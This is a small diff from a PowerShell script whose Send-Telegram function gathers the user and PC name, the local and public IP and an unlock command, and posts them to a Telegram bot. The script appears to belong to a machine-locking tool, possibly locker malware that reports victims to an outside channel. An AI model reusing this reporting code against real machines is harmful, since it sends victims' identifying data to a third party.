@@ -41,7 +41,7 @@ function Send-Telegram {
         $ipPublic = Invoke-RestMethod "https://api.ipify.org"
     } catch { $ipPublic = "n/a" }
 
-    $msg = "🔒 PC $user ($pc) locked.`nIP: $ipLocal | $ipPublic`nUnlock: $unlockCmd"
+    $msg = "PC $user ($pc) locked.`nIP: $ipLocal | $ipPublic`nUnlock: $unlockCmd"
     $body = @{ chat_id = $chatID; text = $msg } | ConvertTo-Json -Compress
     Invoke-RestMethod "https://api.telegram.org/bot$botToken/sendMessage" -Method POST -Body $body -ContentType 'application/json'
 }
